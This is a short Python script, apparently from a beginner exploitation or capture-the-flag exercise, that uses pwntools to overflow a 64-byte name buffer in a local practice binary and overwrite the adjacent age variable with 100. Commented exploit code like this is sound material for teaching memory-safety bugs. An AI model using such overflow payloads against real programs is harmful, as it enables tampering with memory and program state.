import pwn

if __name__ == "__main__":
    target = pwn.process("./a.out")

    # The buffer for the name is 64 bytes long. Immediately following the name is the age,
    # which is 1 byte in size (a char in C is always 1 byte large). In ASCII, the integer
    # 100 maps to lowercase d, so we append that to the end of the payload. This will
    # write past the end of the name buffer, and overwrite the age variable with 100.
    payload = b"A" * 64 + b"d"

    target.sendline(b"1")
    target.sendline(payload)
    target.interactive()
